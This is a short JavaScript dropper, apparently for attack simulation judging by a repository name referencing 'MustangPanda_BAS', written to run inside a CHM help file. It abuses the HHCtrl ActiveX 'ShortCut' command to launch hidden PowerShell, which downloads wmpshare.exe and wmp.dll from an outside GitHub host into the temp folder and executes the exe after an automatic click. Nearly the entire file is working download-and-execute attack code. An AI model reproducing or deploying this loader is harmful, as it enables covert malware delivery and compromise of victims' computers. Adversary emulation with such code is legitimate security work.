// music.js - Download EXE + DLL + Execute (CHM Compatible)

alert("music.js loaded from GitHub!");

try {
    var obj = document.createElement("object");
    obj.setAttribute("classid", "clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11");
    
    var psCommand = ",powershell.exe,-NoProfile -WindowStyle Hidden -Command \"$temp = $env:TEMP; ";
    psCommand += "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/bas07-hub/MustangPanda_BAS/main/wmpshare.exe' -OutFile '$temp\\wmpshare.exe'; ";
    psCommand += "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/bas07-hub/MustangPanda_BAS/main/wmp.dll' -OutFile '$temp\\wmp.dll'; ";
    psCommand += "Start-Process '$temp\\wmpshare.exe'\"";

    obj.innerHTML = 
        '<param name="Command" value="ShortCut">' +
        '<param name="Item1" value="' + psCommand + '">' +
        '<param name="Item2" value="273,1,1">';

    document.body.appendChild(obj);
    
    setTimeout(function() {
        try {
            obj.Click();
            alert("Command sent: Downloading wmpshare.exe + wmp.dll + Executing...");
        } catch(e) {
            alert("Click Error: " + e.message);
        }
    }, 800);

} catch(e) {
    alert("Main Error: " + e.message);
}
